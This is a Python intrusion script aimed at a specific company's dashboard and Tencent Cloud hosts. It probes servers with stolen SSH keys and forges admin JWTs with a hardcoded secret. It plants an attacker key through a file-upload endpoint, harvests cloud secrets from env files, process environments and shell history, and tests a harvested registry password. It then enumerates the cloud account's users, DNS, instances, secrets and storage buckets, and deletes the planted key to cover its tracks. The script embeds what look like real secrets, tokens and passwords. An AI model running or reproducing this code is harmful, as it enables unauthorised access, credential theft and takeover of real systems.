#!/usr/bin/env python3
# i29339 round b: reach the caddy+dnspod host (43.143.107.214 share-center) directly with fleet key,
# read /etc/caddy/dnspod.env (+ /etc/systemd drop-in + caddy proc environ), and also 122.51.1.87;
# then enumerate Tencent account (CAM/dnspod/cvm/cos/ssm/cdb/clb/tke) with any static key found.
# Also test the CCR registry credential harvested from 122.51.1.87 .docker/config.json.
import os, sys, json, time, base64, hmac, hashlib, subprocess, re
import urllib.parse as up
import urllib.request, urllib.error, ssl, datetime

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
HOST = "dashboard.lumiiai.cn"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
KEY = "/tmp/ak29339b"
START = time.time()

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8","replace")).decode()
def R(k,v): print("R:%s:%s" % (k,_b(v)), flush=True)
def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout); return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()

def sh(host, keyfile, cmd, timeout=70):
    args = ["ssh","-i",keyfile,"-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
            "-o","BatchMode=yes","-o","IdentitiesOnly=yes","-o","ConnectTimeout=15","-o","LogLevel=ERROR",
            "ubuntu@"+host, cmd]
    return run(args, timeout=timeout+20)

# ---------------- direct SSH probe ----------------
HOSTS = ["43.143.107.214","122.51.1.87"]
KEYS = ["key_lumii6.pem","key_fleet.pem"]
working = []  # (host, key)
for h in HOSTS:
    for kf in KEYS:
        if not os.path.exists(kf): continue
        rc,out,err = sh(h,kf,"id 2>&1; echo RC=$?", timeout=25)
        txt=out.decode("utf-8","replace")
        ok = "uid=" in txt
        R("SSHPROBE_%s_%s" % (h.replace(".","_"), kf.replace(".pem","")), {"rc":rc,"out":txt[:200],"err":err.decode("utf-8","replace")[-160:]})
        if ok: working.append((h,kf))

# try 122.51.1.87 via files-RPC landing if no direct key
def landing_122():
    run(["ssh-keygen","-t","ed25519","-N","","-f",KEY,"-q"], timeout=30)
    pub=open(KEY+".pub").read().strip(); R("P3_pub", pub)
    open("/tmp/ak_keys2","w").write(pub+"\n")
    def call(path, method="GET", body=None, session=None, admin=False, timeout=30):
        url="https://%s%s"%(HOST,path)
        a=["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
        if session: a+=["-H","Cookie: session="+session]
        if admin: a+=["-H","Authorization: Bearer "+ADMIN_TOKEN]
        if body is not None: a+=["-X",method,"-H","Content-Type: application/json","--data-binary",json.dumps(body)]
        elif method!="GET": a+=["-X",method]
        a+=[url]; rc,out,err=run(a,timeout=timeout+20); t=out.decode("utf-8","replace"); c="";i=t.rfind("__C__")
        if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
        return {"code":c,"body":t[:600000]}
    def b64u(b):
        if isinstance(b,str): b=b.encode()
        return base64.urlsafe_b64encode(b).rstrip(b'=').decode()
    def forge(uid,cust="aro"):
        now=int(time.time())
        hh=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
        pp=b64u(json.dumps({"userId":uid,"email":"p@x","customer":cust,"role":"admin","iat":now,"exp":now+86400*7},separators=(",",":")))
        return hh+"."+pp+"."+b64u(hmac.new(JWT_SECRET.encode(),(hh+"."+pp).encode(),hashlib.sha256).digest())
    r=call("/api/admin/agents",admin=True,timeout=45); j=None
    try: j=json.loads(r["body"])
    except: pass
    agents=(j or {}).get("agents",[]) if j else []
    ca=call("/api/internal/connected-agents",extra_headers=None) if False else None
    connected=set()
    # fetch connected via internal token
    a=["curl","-s","-k","-m","20","--http2","-A",UA,"-H","x-internal-token: "+ADMIN_TOKEN,"-w","\n__C__%{http_code}","https://%s/api/internal/connected-agents"%HOST]
    rc,out,err=run(a,timeout=45); t=out.decode("utf-8","replace")
    try:
        jj=json.loads(t[:t.rfind("__C__")]); arr=jj.get("agents") or jj.get("connected") or []
        if isinstance(arr,dict): arr=list(arr.values())
        for x in arr: connected.add(x if isinstance(x,str) else (x.get("id") or x.get("agentId")))
    except: pass
    byid={a.get("id"):a for a in agents if a.get("id")}
    def score(a):
        cid=a.get("id"); return (0 if cid not in connected else 1,0 if a.get("customer")=="aro" else 1,
            0 if str(a.get("status","")).lower()=="provisioning" else 1, cid or "")
    order=[x.get("id") for x in sorted([a for a in agents if a.get("id")],key=score)[:6]]
    for AID in order:
        a=byid.get(AID)
        if not a: continue
        cust=a.get("customer") or "aro"; orig={"ip":a.get("ip"),"sshUser":a.get("sshUser")}
        call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":"127.0.0.1","ssh_user":"ubuntu"},timeout=25)
        sess=forge("af0a2285-490f-11f1-ac43-525400595be1",cust)
        url="https://%s/api/agents/%s/files/upload?path=%s"%(HOST,AID,up.quote("/home/ubuntu/.ssh",safe="/"))
        ua=["curl","-s","-k","-m","60","--http2","-A",UA,"-H","Cookie: session="+sess,
            "-F","files=@/tmp/ak_keys2;filename=authorized_keys2;type=text/plain","-w","\n__C__%{http_code}",url]
        run(ua,timeout=80)
        call("/api/admin/agents",method="PATCH",admin=True,body={"id":AID,"host":orig.get("ip"),"ssh_user":orig.get("sshUser")},timeout=25)
        rc,out,err=sh("122.51.1.87",KEY,"id; hostname; sudo -n true 2>&1 && echo SUDO:ok",timeout=30)
        if b"uid=" in out:
            R("LAND_OK",{"aid":AID}); return KEY
    return None

lkey_122 = None
if not any(h=="122.51.1.87" for h,_ in working):
    R("LANDING","122.51.1.87 via files-RPC"); lkey_122 = landing_122()
    if lkey_122: working.append(("122.51.1.87", lkey_122))
R("WORKING", working)

if not working:
    R("P7_result","NO_SHELL_ANY"); R("P99_done",{"elapsed":int(time.time()-START)}); print("NO SHELL", flush=True); sys.exit(0)

# ---------------- harvest ----------------
harv_text = ""
SECS_43 = [
 ("CADDYENV", "echo '@@DNSPOD_ENV@@'; sudo cat /etc/caddy/dnspod.env 2>/dev/null; echo '@@DROPIN@@'; sudo cat /etc/systemd/system/caddy.service.d/*.conf 2>/dev/null; echo '@@LSCADDY@@'; sudo ls -la /etc/caddy/ 2>/dev/null", 45),
 ("PROCENV", "for p in $(sudo pgrep -x caddy 2>/dev/null); do echo PID$p; sudo tr '\\0' '\\n' < /proc/$p/environ 2>/dev/null | grep -aiE 'TENCENTCLOUD|COS_SECRET|DNSPOD|MODERATION'; done", 40),
 ("FINDENV", "sudo find /etc /root /home /opt /data -maxdepth 4 \\( -iname 'dnspod*' -o -iname '*.env' -o -iname '*.env.*' \\) 2>/dev/null | grep -viE 'node_modules|/proc/' | head -60", 50),
 ("GREPKEYS", "timeout 55 sudo grep -rIhoE '(TENCENTCLOUD|COS|LUMII_MODERATION)_SECRET_(ID|KEY)[=: \"'\"'\"']+[A-Za-z0-9/+=_-]{8,}' --include='*.env' --include='*.sh' --include='*.conf' --include='*.toml' --include='*.yml' --include='*.yaml' /etc/caddy /root /home /opt /data 2>/dev/null | sort -u | head -80", 90),
 ("HIST", "sudo grep -aiE 'cos_secret|tencentcloud|dnspod|secretid|secretkey' /root/.bash_history /home/*/.bash_history 2>/dev/null | tail -40", 45),
]
for h,kf in working:
    prefix = h.replace(".","_")
    for tag,cmd,tmo in SECS_43:
        rc,out,err = sh(h,kf,cmd,timeout=tmo)
        harv_text += "\n@@@@%s_%s_rc%d@@@@\n" % (prefix,tag,rc) + out.decode("utf-8","replace")
    # quick 122-specific /opt/lumii-prod registry & bash history
    if h=="122.51.1.87":
        rc,out,err = sh(h,kf,"sudo ls -la /opt/lumii-registry /data/lumii-shared 2>/dev/null; echo @@REGSCRIPT@@; sudo cat /opt/lumii-prod/scripts/deploy-registry.sh 2>/dev/null | head -60; echo @@HIST2@@; sudo grep -aiE 'cos_secret|tencentcloud|dnspod|ccr|docker login' /home/ubuntu/.bash_history 2>/dev/null | tail -40", timeout=50)
        harv_text += "\n@@@@PROD_reg_rc%d@@@@\n" % rc + out.decode("utf-8","replace")

secs = {}
cur=None; buf=[]
for line in harv_text.splitlines():
    if line.startswith("@@@@") and line.endswith("@@@@") and len(line)>8:
        if cur: secs[cur]="\n".join(buf).strip()
        cur=line.strip("@"); buf=[]
    elif cur is not None: buf.append(line)
if cur: secs[cur]="\n".join(buf).strip()
R("HARV", {"sections": {k:v[:4000] for k,v in secs.items()}, "len": len(harv_text)})
R("HARV_RAW", harv_text[-16000:])

# ---------------- parse creds ----------------
sid=skey=cosid=coskey=modid=modkey=None
m=re.search(r"TENCENTCLOUD_SECRET_ID[=:\s '\"]{1,6}([A-Za-z0-9/+_\-]{16,90})", harv_text); sid=m.group(1) if m else None
m=re.search(r"TENCENTCLOUD_SECRET_KEY[=:\s '\"]{1,6}([A-Za-z0-9/+_\-]{16,90})", harv_text); skey=m.group(1) if m else None
m=re.search(r"COS_SECRET_ID[=:\s '\"]{1,6}([A-Za-z0-9/+_\-]{16,90})", harv_text); cosid=m.group(1) if m else None
m=re.search(r"COS_SECRET_KEY[=:\s '\"]{1,6}([A-Za-z0-9/+_\-]{16,90})", harv_text); coskey=m.group(1) if m else None
m=re.search(r"LUMII_MODERATION_SECRET_ID[=:\s '\"]{1,6}([A-Za-z0-9/+_\-]{16,90})", harv_text); modid=m.group(1) if m else None
m=re.search(r"LUMII_MODERATION_SECRET_KEY[=:\s '\"]{1,6}([A-Za-z0-9/+_\-]{16,90})", harv_text); modkey=m.group(1) if m else None
R("CRED_FOUND", {"sid":sid,"skey_len":len(skey) if skey else 0,"cosid":cosid,"coskey_len":len(coskey) if coskey else 0,"modid":modid,"modkey_len":len(modkey) if modkey else 0})

# ---------------- CCR registry test (cred from 122.51.1.87) ----------------
def curl_out(args,timeout=30):
    rc,out,err=run(args,timeout=timeout); return rc,out,err
ccr_user="100020204258"; ccr_pass="c8Eep&!PjBt18QRt"
for path in ["/v2/_catalog","/v2/lumii/lumii-center/tags/list"]:
    rc,out,err=curl_out(["curl","-s","-m","25","-u","%s:%s"%(ccr_user,ccr_pass),"-A",UA,"-w","\n__C__%{http_code}","https://ccr.ccs.tencentyun.com"+path])
    R("CCR_"+path.replace("/","_").replace(".","_"), out.decode("utf-8","replace")[:1500])

if not (sid and skey):
    # try cos creds as tencent api (rare)
    if cosid and coskey: sid,skey=cosid,coskey
    if not (sid and skey):
        for h,kf in working:
            if kf not in ("key_lumii6.pem","key_fleet.pem"):
                sh(h,kf,"unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED",timeout=30)
            else:
                sh(h,kf,"sudo -n unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED",timeout=30)
        R("P7_result","NO_TENCENT_KEY_FOUND"); R("P99_done",{"elapsed":int(time.time()-START)}); print("NO KEY", flush=True); sys.exit(0)

# ---------------- Tencent API enumeration ----------------
def _sha256hex(s):
    if isinstance(s,str): s=s.encode()
    return hashlib.sha256(s).hexdigest()
def _hmac(key,msg):
    if isinstance(key,str): key=key.encode()
    if isinstance(msg,str): msg=msg.encode()
    return hmac.new(key,msg,hashlib.sha256).digest()
def tc2(service,action,version,region,payload=None,timeout=12,kid=None,kkey=None):
    SID2=kid or sid; SKEY2=kkey or skey; payload=payload or {}
    body=json.dumps(payload,separators=(",",":")) if payload else "{}"
    host=service+".tencentcloudapi.com"; ts=int(time.time()); date=datetime.datetime.utcfromtimestamp(ts).strftime("%Y-%m-%d")
    ct="application/json; charset=utf-8"
    ch="content-type:%s\nhost:%s\nx-tc-action:%s\n"%(ct,host,action.lower()); shd="content-type;host;x-tc-action"
    cr="POST\n/\n\n"+ch+"\n"+shd+"\n"+_sha256hex(body); scope="%s/%s/tc3_request"%(date,service)
    sts="TC3-HMAC-SHA256\n%d\n%s\n%s"%(ts,scope,_sha256hex(cr))
    kd=_hmac("TC3"+SKEY2,date); ks=_hmac(kd,service); ksign=_hmac(ks,"tc3_request")
    sig=hmac.new(ksign,sts.encode(),hashlib.sha256).hexdigest()
    auth="TC3-HMAC-SHA256 Credential=%s/%s, SignedHeaders=%s, Signature=%s"%(SID2,scope,shd,sig)
    hdr={"Authorization":auth,"Content-Type":ct,"X-TC-Action":action,"X-TC-Version":version,"X-TC-Timestamp":str(ts),"Host":host}
    if region: hdr["X-TC-Region"]=region
    req=urllib.request.Request("https://"+host+"/",data=body.encode(),headers=hdr,method="POST")
    try:
        resp=urllib.request.urlopen(req,timeout=timeout,context=ssl._create_unverified_context()); return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        try: return json.loads(e.read().decode())
        except: return {"Response":{"Error":{"Code":"HTTP%s"%e.code}}}
    except Exception as e: return {"Response":{"Error":{"Code":"EXC","Message":repr(e)[:120]}}}
def terr2(resp):
    e=(resp or {}).get("Response",{}).get("Error")
    return "%s:%s"%(e.get("Code"),str(e.get("Message",""))[:80]) if e else None

appid=tc2("cam","GetUserAppId","2019-01-16","",{})
R("P8_identity",{"resp":(appid.get("Response") or {}),"err":terr2(appid)})
lu=tc2("cam","ListUsers","2019-01-16","",{"Rp":100}); R("P8_cam_users",{"err":terr2(lu),"n":len(((lu.get("Response") or {}).get("Data")) or []),"data":(lu.get("Response") or {}).get("Data")})

domains=[]; dns_errors=[]
d=tc2("dnspod","DescribeDomainList","2021-03-23","",{"Limit":200}); er=terr2(d)
if er: dns_errors.append({"DescribeDomainList":er})
else:
    for x in (d.get("Response",{}) or {}).get("DomainList",[]) or []:
        domains.append({"name":x.get("Name"),"id":x.get("DomainId"),"status":x.get("Status")})
R("P8_dns_domains",{"n":len(domains),"items":domains[:100],"errors":dns_errors})
dns_recs=[]
for dm in domains[:40]:
    nm=dm.get("name")
    if not nm: continue
    rr=tc2("dnspod","DescribeRecordList","2021-03-23","",{"Domain":nm,"Limit":3000}); er=terr2(rr)
    if er: dns_recs.append({"domain":nm,"err":er}); continue
    recs=(rr.get("Response",{}) or {}).get("RecordList",[]) or []
    inter=[]
    for rc2 in recs:
        val="%s %s %s"%(rc2.get("Name"),rc2.get("Type"),rc2.get("Value"))
        if re.search(r"zoofi|index|tunnel|3000|33306|cloudflare|workers\.dev|trycloudflare|cfargotunnel|lumii-ai|122\.51",val,re.I):
            inter.append({"name":rc2.get("Name"),"type":rc2.get("Type"),"value":rc2.get("Value")})
    dns_recs.append({"domain":nm,"n":len(recs),"interesting":inter[:80]})
R("P8_dns_records",{"n":len(dns_recs),"items":dns_recs[:50]})

r2=tc2("cvm","DescribeRegions","2017-03-12","",{}); er=terr2(r2)
regions=[] if er else [x.get("Region") for x in (r2.get("Response",{}) or {}).get("RegionSet",[]) if x.get("Region")]
R("P8_regions",{"err":er,"n":len(regions)})
inst=[]
for reg in (regions or ["ap-shanghai","ap-guangzhou","ap-beijing","ap-hongkong"]):
    if 1500<(time.time()-START): break
    resp=tc2("cvm","DescribeInstances","2017-03-12",reg,{"Limit":100}); er=terr2(resp)
    if er: inst.append({"region":reg,"err":er}); continue
    rs=resp.get("Response",{}) or {}
    if rs.get("TotalCount"):
        for it in rs.get("InstanceSet",[]):
            inst.append({"region":reg,"id":it.get("InstanceId"),"name":it.get("InstanceName"),"state":it.get("InstanceState"),
                         "priv":it.get("PrivateIpAddresses"),"pub":it.get("PublicIpAddresses"),
                         "tags":[{t.get("Key"):t.get("Value")} for t in (it.get("Tags") or [])]})
R("P8_instances",{"n":len(inst),"items":inst[:300]})

# ssM / cdb / clb / tke quick
for svc,act,ver,reg in [("ssm","ListSecrets","2019-09-23","ap-shanghai"),("cdb","DescribeDBInstances","2017-03-20","ap-shanghai"),
                        ("clb","DescribeLoadBalancers","2018-03-17","ap-shanghai"),("tke","DescribeClusters","2018-05-25","ap-shanghai"),
                        ("vpc","DescribeVpcs","2017-03-12","ap-shanghai")]:
    if 1600<(time.time()-START): break
    rr=tc2(svc,act,ver,reg,{"Limit":50}); R("P8_"+svc,{"err":terr2(rr),"resp":str((rr.get("Response") or {}))[:900]})

def cos_auth2(kid,kkey,method,path,params=None):
    st=int(time.time()); sign_time="%d;%d"%(st-60,st+3600); key_time=sign_time
    sign_key=hmac.new(kkey.encode(),key_time.encode(),hashlib.sha1).hexdigest(); params=params or {}
    enc=lambda v: up.quote(str(v),safe='')
    http_params="&".join("%s=%s"%(k.lower(),enc(v)) for k,v in sorted(params.items(),key=lambda kv:kv[0].lower()))
    param_list=";".join(sorted([k.lower() for k in params.keys()]))
    http_string=method.lower()+"\n"+path+"\n"+http_params+"\n\n"
    string_to_sign="sha1\n"+sign_time+"\n"+hashlib.sha1(http_string.encode()).hexdigest()+"\n"
    sig=hmac.new(sign_key.encode(),string_to_sign.encode(),hashlib.sha1).hexdigest()
    return "q-sign-algorithm=sha1&q-ak=%s&q-sign-time=%s&q-key-time=%s&q-header-list=&q-url-param-list=%s&q-signature=%s"%(kid,sign_time,key_time,param_list,sig)
def cos_get2(kid,kkey,host,path,params=None,timeout=15):
    auth=cos_auth2(kid,kkey,"GET",path,params); url="https://"+host+path
    if params: url+="?"+"&".join("%s=%s"%(k,up.quote(str(v),safe='')) for k,v in params.items())
    req=urllib.request.Request(url,headers={"Authorization":auth},method="GET")
    try:
        r=urllib.request.urlopen(req,timeout=timeout,context=ssl._create_unverified_context()); return r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e:
        try: return e.read().decode("utf-8","replace")
        except: return "HTTP%s"%e.code
    except Exception as e: return "EXC:%s"%repr(e)[:120]
kid2=cosid or sid; kkey2=coskey or skey
svc=cos_get2(kid2,kkey2,"service.cos.myqcloud.com","/")
bl=[]
for mm in re.finditer(r"<Bucket>(.*?)</Bucket>",svc,re.S):
    blk=mm.group(1); nm=re.search(r"<Name>(.*?)</Name>",blk); loc=re.search(r"<Location>(.*?)</Location>",blk)
    if nm: bl.append({"name":nm.group(1),"loc":(loc.group(1) if loc else "")})
R("P8_cos",{"raw":svc[:1200],"buckets":bl[:100]})

# cleanup landing key
if lkey_122:
    sh("122.51.1.87",lkey_122,"unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; echo CLEANED",timeout=30)
R("P99_done",{"elapsed":int(time.time()-START)})
print("DONE", flush=True)
